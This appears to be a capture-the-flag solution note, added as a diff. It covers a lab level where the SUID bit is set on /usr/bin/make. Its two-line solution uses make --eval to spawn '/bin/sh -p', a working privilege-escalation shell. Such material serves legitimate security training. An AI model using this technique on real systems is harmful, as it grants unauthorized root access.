@@ -1,0 +1,18 @@
+//TESTO
+
+hacker@babysuid_level26:~$ /challenge/babysuid_level26 
+Welcome to /challenge/babysuid_level26!
+
+This challenge is part of a series of programs that
+will enable you to read flags by making them execute other commands.
+
+I just set the SUID bit on /usr/bin/make.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (/challenge/babysuid_level26) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/make!
+
+//SOLUZIONE
+
+hacker@babysuid_level26:~$ COMMAND='/bin/sh -p'
+hacker@babysuid_level26:~$ make -s --eval=$'x:\n\t-'"$COMMAND"
